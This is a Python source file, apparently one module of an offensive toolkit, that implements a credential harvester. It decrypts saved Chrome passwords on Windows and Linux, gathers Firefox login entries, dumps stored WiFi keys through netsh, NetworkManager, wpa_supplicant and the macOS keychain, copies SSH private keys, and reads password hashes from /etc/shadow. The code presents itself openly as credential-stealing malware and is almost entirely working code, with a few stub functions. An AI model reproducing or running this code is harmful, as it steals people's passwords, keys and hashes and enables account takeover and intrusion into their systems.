#!/usr/bin/env python3
"""
Credential Harvesting Implementation
Extract credentials from browsers, WiFi, SSH, and system
"""

import os
import sys
import json
import base64
import sqlite3
import platform
import ctypes
from pathlib import Path
from typing import List, Dict, Any, Optional
import hashlib
import hmac
from datetime import datetime, timedelta

from Core.config_loader import config
from Core.logger import get_logger

log = get_logger('credential_harvester')

class CredentialHarvester:
    """
    Harvest credentials from various sources
    Supports browsers, WiFi passwords, SSH keys, and system credentials
    """
    
    def __init__(self):
        self.os_type = platform.system().lower()
        self.credentials = []
        
        log.info(f"Credential harvester initialized on {self.os_type}")
    
    def harvest_all(self) -> List[Dict[str, Any]]:
        """
        Harvest credentials from all available sources
        
        Returns:
            List of harvested credentials
        """
        
        self.credentials = []
        
        # Browser credentials
        try:
            browser_creds = self.harvest_browser_passwords()
            self.credentials.extend(browser_creds)
            log.info(f"Harvested {len(browser_creds)} browser credentials")
        except Exception as e:
            log.error(f"Browser harvest failed: {e}")
        
        # WiFi passwords
        try:
            wifi_creds = self.harvest_wifi_passwords()
            self.credentials.extend(wifi_creds)
            log.info(f"Harvested {len(wifi_creds)} WiFi passwords")
        except Exception as e:
            log.error(f"WiFi harvest failed: {e}")
        
        # SSH keys
        try:
            ssh_keys = self.harvest_ssh_keys()
            self.credentials.extend(ssh_keys)
            log.info(f"Harvested {len(ssh_keys)} SSH keys")
        except Exception as e:
            log.error(f"SSH harvest failed: {e}")
        
        # System credentials
        try:
            sys_creds = self.harvest_system_credentials()
            self.credentials.extend(sys_creds)
            log.info(f"Harvested {len(sys_creds)} system credentials")
        except Exception as e:
            log.error(f"System harvest failed: {e}")
        
        return self.credentials
    
    def harvest_browser_passwords(self) -> List[Dict[str, Any]]:
        """
        Harvest passwords from web browsers
        
        Returns:
            List of browser credentials
        """
        
        credentials = []
        
        if self.os_type == 'windows':
            credentials.extend(self._harvest_chrome_windows())
            credentials.extend(self._harvest_firefox_windows())
            credentials.extend(self._harvest_edge_windows())
        elif self.os_type == 'linux':
            credentials.extend(self._harvest_chrome_linux())
            credentials.extend(self._harvest_firefox_linux())
        elif self.os_type == 'darwin':
            credentials.extend(self._harvest_chrome_macos())
            credentials.extend(self._harvest_safari_macos())
        
        return credentials
    
    def _harvest_chrome_windows(self) -> List[Dict[str, Any]]:
        """Harvest Chrome passwords on Windows"""
        
        credentials = []
        
        try:
            # Chrome stores passwords in SQLite database
            local_state_path = os.path.join(
                os.environ['USERPROFILE'],
                'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'
            )
            
            # Get master key for decryption
            master_key = None
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    # Remove DPAPI prefix
                    encrypted_key = encrypted_key[5:]
                    
                    # Decrypt using Windows DPAPI
                    try:
                        import win32crypt
                        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    except:
                        # Alternative using ctypes
                        master_key = self._dpapi_decrypt(encrypted_key)
            
            # Find all Chrome profiles
            profiles_path = os.path.join(
                os.environ['USERPROFILE'],
                'AppData', 'Local', 'Google', 'Chrome', 'User Data'
            )
            
            for profile in os.listdir(profiles_path):
                if profile.startswith('Profile') or profile == 'Default':
                    login_db_path = os.path.join(profiles_path, profile, 'Login Data')
                    
                    if os.path.exists(login_db_path):
                        # Copy database to temp location
                        import shutil
                        import tempfile
                        
                        temp_db = tempfile.NamedTemporaryFile(delete=False)
                        shutil.copy2(login_db_path, temp_db.name)
                        
                        # Connect to database
                        conn = sqlite3.connect(temp_db.name)
                        cursor = conn.cursor()
                        
                        # Query passwords
                        cursor.execute("""
                            SELECT origin_url, username_value, password_value 
                            FROM logins 
                            WHERE password_value != ''
                        """)
                        
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            
                            # Decrypt password
                            if master_key:
                                password = self._decrypt_chrome_password(encrypted_password, master_key)
                            else:
                                password = encrypted_password
                            
                            credentials.append({
                                'source': 'Chrome',
                                'url': url,
                                'username': username,
                                'password': password,
                                'timestamp': datetime.now().isoformat()
                            })
                        
                        conn.close()
                        os.unlink(temp_db.name)
            
        except Exception as e:
            log.error(f"Chrome Windows harvest failed: {e}")
        
        return credentials
    
    def _decrypt_chrome_password(self, encrypted_password: bytes, master_key: bytes) -> str:
        """Decrypt Chrome password using AES-GCM"""
        
        try:
            # Chrome v80+ uses AES-GCM
            from Crypto.Cipher import AES
            
            # Get initialization vector
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            
            # Create cipher
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            
            # Decrypt
            decrypted = cipher.decrypt(payload)
            
            # Remove padding
            decrypted = decrypted[:-16]
            
            return decrypted.decode('utf-8', errors='ignore')
            
        except Exception as e:
            log.debug(f"Chrome password decryption failed: {e}")
            return ""
    
    def _dpapi_decrypt(self, encrypted_data: bytes) -> Optional[bytes]:
        """Decrypt using Windows DPAPI with ctypes"""
        
        if self.os_type != 'windows':
            return None
        
        try:
            import ctypes
            import ctypes.wintypes
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [
                    ('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_byte))
                ]
            
            # Prepare data
            encrypted_blob = DATA_BLOB()
            encrypted_blob.cbData = len(encrypted_data)
            encrypted_blob.pbData = ctypes.cast(
                ctypes.create_string_buffer(encrypted_data, len(encrypted_data)),
                ctypes.POINTER(ctypes.c_byte)
            )
            
            decrypted_blob = DATA_BLOB()
            
            # Call CryptUnprotectData
            result = ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(encrypted_blob),
                None,
                None,
                None,
                None,
                0,
                ctypes.byref(decrypted_blob)
            )
            
            if result:
                # Extract decrypted data
                decrypted = ctypes.string_at(
                    decrypted_blob.pbData,
                    decrypted_blob.cbData
                )
                
                # Free memory
                ctypes.windll.kernel32.LocalFree(decrypted_blob.pbData)
                
                return decrypted
                
        except Exception as e:
            log.debug(f"DPAPI decryption failed: {e}")
        
        return None
    
    def _harvest_firefox_windows(self) -> List[Dict[str, Any]]:
        """Harvest Firefox passwords on Windows"""
        
        credentials = []
        
        try:
            # Firefox profile path
            profiles_path = os.path.join(
                os.environ['APPDATA'],
                'Mozilla', 'Firefox', 'Profiles'
            )
            
            if not os.path.exists(profiles_path):
                return credentials
            
            # Find all Firefox profiles
            for profile in os.listdir(profiles_path):
                profile_path = os.path.join(profiles_path, profile)
                
                # Check for key4.db and logins.json
                key4_path = os.path.join(profile_path, 'key4.db')
                logins_path = os.path.join(profile_path, 'logins.json')
                
                if os.path.exists(logins_path):
                    # Read encrypted logins
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        logins_data = json.load(f)
                    
                    for login in logins_data.get('logins', []):
                        # Firefox uses NSS for encryption
                        # This would require python-nss or similar
                        credentials.append({
                            'source': 'Firefox',
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', ''),
                            'password': login.get('encryptedPassword', ''),
                            'encrypted': True,
                            'timestamp': datetime.now().isoformat()
                        })
            
        except Exception as e:
            log.error(f"Firefox Windows harvest failed: {e}")
        
        return credentials
    
    def _harvest_edge_windows(self) -> List[Dict[str, Any]]:
        """Harvest Edge passwords on Windows"""
        
        # Edge uses similar storage to Chrome
        credentials = []
        
        try:
            local_state_path = os.path.join(
                os.environ['USERPROFILE'],
                'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State'
            )
            
            # Similar process to Chrome
            # Edge also uses Chromium engine
            
        except Exception as e:
            log.error(f"Edge Windows harvest failed: {e}")
        
        return credentials
    
    def _harvest_chrome_linux(self) -> List[Dict[str, Any]]:
        """Harvest Chrome passwords on Linux"""
        
        credentials = []
        
        try:
            # Chrome config path
            chrome_path = os.path.expanduser('~/.config/google-chrome')
            
            if not os.path.exists(chrome_path):
                # Try Chromium
                chrome_path = os.path.expanduser('~/.config/chromium')
            
            if os.path.exists(chrome_path):
                # Default profile
                login_db_path = os.path.join(chrome_path, 'Default', 'Login Data')
                
                if os.path.exists(login_db_path):
                    # Copy database
                    import shutil
                    import tempfile
                    
                    temp_db = tempfile.NamedTemporaryFile(delete=False)
                    shutil.copy2(login_db_path, temp_db.name)
                    
                    # Connect to database
                    conn = sqlite3.connect(temp_db.name)
                    cursor = conn.cursor()
                    
                    cursor.execute("""
                        SELECT origin_url, username_value, password_value 
                        FROM logins 
                        WHERE password_value != ''
                    """)
                    
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        
                        # Linux Chrome uses gnome-keyring or basic encryption
                        password = self._decrypt_chrome_linux_password(encrypted_password)
                        
                        credentials.append({
                            'source': 'Chrome',
                            'url': url,
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat()
                        })
                    
                    conn.close()
                    os.unlink(temp_db.name)
            
        except Exception as e:
            log.error(f"Chrome Linux harvest failed: {e}")
        
        return credentials
    
    def _decrypt_chrome_linux_password(self, encrypted_password: bytes) -> str:
        """Decrypt Chrome password on Linux"""
        
        try:
            # Check for v10 prefix (gnome-keyring)
            if encrypted_password[:3] == b'v10':
                # Use gnome-keyring
                # This would require secretstorage library
                return ""
            
            # Check for v11 prefix (basic encryption)
            elif encrypted_password[:3] == b'v11':
                # Use hardcoded key "peanuts"
                from Crypto.Cipher import AES
                from Crypto.Protocol.KDF import PBKDF2
                
                # Derive key
                salt = b'saltysalt'
                key = PBKDF2('peanuts', salt, 16, 1)
                
                # Decrypt
                iv = b' ' * 16
                cipher = AES.new(key, AES.MODE_CBC, iv)
                
                decrypted = cipher.decrypt(encrypted_password[3:])
                
                # Remove padding
                padding = decrypted[-1]
                if padding:
                    decrypted = decrypted[:-padding]
                
                return decrypted.decode('utf-8', errors='ignore')
            
        except Exception as e:
            log.debug(f"Chrome Linux decryption failed: {e}")
        
        return ""
    
    def _harvest_firefox_linux(self) -> List[Dict[str, Any]]:
        """Harvest Firefox passwords on Linux"""
        
        credentials = []
        
        try:
            # Firefox profile path
            firefox_path = os.path.expanduser('~/.mozilla/firefox')
            
            if os.path.exists(firefox_path):
                # Read profiles.ini
                profiles_ini = os.path.join(firefox_path, 'profiles.ini')
                
                if os.path.exists(profiles_ini):
                    # Parse profiles
                    import configparser
                    config = configparser.ConfigParser()
                    config.read(profiles_ini)
                    
                    for section in config.sections():
                        if section.startswith('Profile'):
                            if config.has_option(section, 'Path'):
                                profile_path = config.get(section, 'Path')
                                
                                if not os.path.isabs(profile_path):
                                    profile_path = os.path.join(firefox_path, profile_path)
                                
                                # Check for logins.json
                                logins_path = os.path.join(profile_path, 'logins.json')
                                
                                if os.path.exists(logins_path):
                                    with open(logins_path, 'r') as f:
                                        logins_data = json.load(f)
                                    
                                    for login in logins_data.get('logins', []):
                                        credentials.append({
                                            'source': 'Firefox',
                                            'url': login.get('hostname', ''),
                                            'username': login.get('encryptedUsername', ''),
                                            'password': login.get('encryptedPassword', ''),
                                            'encrypted': True,
                                            'timestamp': datetime.now().isoformat()
                                        })
            
        except Exception as e:
            log.error(f"Firefox Linux harvest failed: {e}")
        
        return credentials
    
    def _harvest_chrome_macos(self) -> List[Dict[str, Any]]:
        """Harvest Chrome passwords on macOS"""
        
        # Similar to Linux but uses macOS Keychain
        return self._harvest_chrome_linux()
    
    def _harvest_safari_macos(self) -> List[Dict[str, Any]]:
        """Harvest Safari passwords on macOS"""
        
        credentials = []
        
        try:
            # Safari uses macOS Keychain
            # This would require keychain access
            pass
            
        except Exception as e:
            log.error(f"Safari macOS harvest failed: {e}")
        
        return credentials
    
    def harvest_wifi_passwords(self) -> List[Dict[str, Any]]:
        """
        Harvest WiFi passwords
        
        Returns:
            List of WiFi credentials
        """
        
        credentials = []
        
        if self.os_type == 'windows':
            credentials = self._harvest_wifi_windows()
        elif self.os_type == 'linux':
            credentials = self._harvest_wifi_linux()
        elif self.os_type == 'darwin':
            credentials = self._harvest_wifi_macos()
        
        return credentials
    
    def _harvest_wifi_windows(self) -> List[Dict[str, Any]]:
        """Harvest WiFi passwords on Windows"""
        
        credentials = []
        
        try:
            # Use netsh to get WiFi profiles
            import subprocess
            
            # Get all profiles
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                shell=True
            )
            
            profiles = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line:
                    profile = line.split(':')[1].strip()
                    profiles.append(profile)
            
            # Get password for each profile
            for profile in profiles:
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                
                password = ''
                for line in result.stdout.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        break
                
                if password:
                    credentials.append({
                        'source': 'WiFi',
                        'ssid': profile,
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    })
            
        except Exception as e:
            log.error(f"WiFi Windows harvest failed: {e}")
        
        return credentials
    
    def _harvest_wifi_linux(self) -> List[Dict[str, Any]]:
        """Harvest WiFi passwords on Linux"""
        
        credentials = []
        
        try:
            # NetworkManager stores WiFi passwords
            nm_path = '/etc/NetworkManager/system-connections'
            
            if os.path.exists(nm_path) and os.access(nm_path, os.R_OK):
                for file in os.listdir(nm_path):
                    file_path = os.path.join(nm_path, file)
                    
                    try:
                        with open(file_path, 'r') as f:
                            content = f.read()
                        
                        ssid = ''
                        password = ''
                        
                        for line in content.split('\n'):
                            if 'ssid=' in line:
                                ssid = line.split('=')[1].strip()
                            elif 'psk=' in line:
                                password = line.split('=')[1].strip()
                        
                        if ssid and password:
                            credentials.append({
                                'source': 'WiFi',
                                'ssid': ssid,
                                'password': password,
                                'timestamp': datetime.now().isoformat()
                            })
                    except:
                        pass
            
            # Also check wpa_supplicant
            wpa_path = '/etc/wpa_supplicant/wpa_supplicant.conf'
            
            if os.path.exists(wpa_path) and os.access(wpa_path, os.R_OK):
                with open(wpa_path, 'r') as f:
                    content = f.read()
                
                # Parse wpa_supplicant.conf
                import re
                networks = re.findall(r'network=\{([^}]+)\}', content, re.DOTALL)
                
                for network in networks:
                    ssid_match = re.search(r'ssid="([^"]+)"', network)
                    psk_match = re.search(r'psk="([^"]+)"', network)
                    
                    if ssid_match and psk_match:
                        credentials.append({
                            'source': 'WiFi',
                            'ssid': ssid_match.group(1),
                            'password': psk_match.group(1),
                            'timestamp': datetime.now().isoformat()
                        })
            
        except Exception as e:
            log.error(f"WiFi Linux harvest failed: {e}")
        
        return credentials
    
    def _harvest_wifi_macos(self) -> List[Dict[str, Any]]:
        """Harvest WiFi passwords on macOS"""
        
        credentials = []
        
        try:
            # macOS stores WiFi passwords in Keychain
            # Use security command
            import subprocess
            
            # Get WiFi network names
            result = subprocess.run(
                ['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'],
                capture_output=True,
                text=True
            )
            
            # Parse networks
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) > 0:
                    ssid = parts[0]
                    
                    # Try to get password from keychain
                    try:
                        result = subprocess.run(
                            ['security', 'find-generic-password', '-wa', ssid],
                            capture_output=True,
                            text=True
                        )
                        
                        if result.returncode == 0:
                            password = result.stdout.strip()
                            
                            credentials.append({
                                'source': 'WiFi',
                                'ssid': ssid,
                                'password': password,
                                'timestamp': datetime.now().isoformat()
                            })
                    except:
                        pass
            
        except Exception as e:
            log.error(f"WiFi macOS harvest failed: {e}")
        
        return credentials
    
    def harvest_ssh_keys(self) -> List[Dict[str, Any]]:
        """
        Harvest SSH keys
        
        Returns:
            List of SSH keys
        """
        
        credentials = []
        
        try:
            # Common SSH key locations
            ssh_paths = [
                os.path.expanduser('~/.ssh'),
                '/etc/ssh',
                os.path.join(os.environ.get('USERPROFILE', ''), '.ssh') if self.os_type == 'windows' else ''
            ]
            
            key_files = ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']
            
            for ssh_path in ssh_paths:
                if os.path.exists(ssh_path):
                    for key_file in key_files:
                        private_key_path = os.path.join(ssh_path, key_file)
                        public_key_path = f"{private_key_path}.pub"
                        
                        if os.path.exists(private_key_path):
                            try:
                                with open(private_key_path, 'r') as f:
                                    private_key = f.read()
                                
                                public_key = ''
                                if os.path.exists(public_key_path):
                                    with open(public_key_path, 'r') as f:
                                        public_key = f.read()
                                
                                credentials.append({
                                    'source': 'SSH',
                                    'type': key_file,
                                    'private_key': private_key,
                                    'public_key': public_key,
                                    'path': private_key_path,
                                    'timestamp': datetime.now().isoformat()
                                })
                                
                            except Exception as e:
                                log.debug(f"Failed to read SSH key {private_key_path}: {e}")
            
        except Exception as e:
            log.error(f"SSH harvest failed: {e}")
        
        return credentials
    
    def harvest_system_credentials(self) -> List[Dict[str, Any]]:
        """
        Harvest system credentials (SAM, shadow, etc.)
        
        Returns:
            List of system credentials
        """
        
        credentials = []
        
        if self.os_type == 'windows':
            credentials = self._harvest_sam_windows()
        elif self.os_type == 'linux':
            credentials = self._harvest_shadow_linux()
        
        return credentials
    
    def _harvest_sam_windows(self) -> List[Dict[str, Any]]:
        """Harvest SAM database on Windows"""
        
        credentials = []
        
        # This requires admin privileges
        # Would extract SAM hashes
        
        return credentials
    
    def _harvest_shadow_linux(self) -> List[Dict[str, Any]]:
        """Harvest shadow file on Linux"""
        
        credentials = []
        
        try:
            # Check if we can read shadow file
            shadow_path = '/etc/shadow'
            
            if os.path.exists(shadow_path) and os.access(shadow_path, os.R_OK):
                with open(shadow_path, 'r') as f:
                    for line in f:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            username = parts[0]
                            password_hash = parts[1]
                            
                            if password_hash and password_hash not in ['*', '!', '!!']:
                                credentials.append({
                                    'source': 'System',
                                    'username': username,
                                    'hash': password_hash,
                                    'timestamp': datetime.now().isoformat()
                                })
            
        except Exception as e:
            log.error(f"Shadow harvest failed: {e}")
        
        return credentials

# Test credential harvesting
if __name__ == "__main__":
    print("Testing Credential Harvester")
    print("-" * 50)
    
    harvester = CredentialHarvester()
    
    # Test individual components
    print(f"OS: {harvester.os_type}")
    
    # Test WiFi harvest (safe to test)
    wifi_creds = harvester.harvest_wifi_passwords()
    print(f"WiFi credentials: {len(wifi_creds)} found")
    
    # Test SSH keys (safe to test)
    ssh_keys = harvester.harvest_ssh_keys()
    print(f"SSH keys: {len(ssh_keys)} found")
    
    print("\n✅ Credential harvester module working!")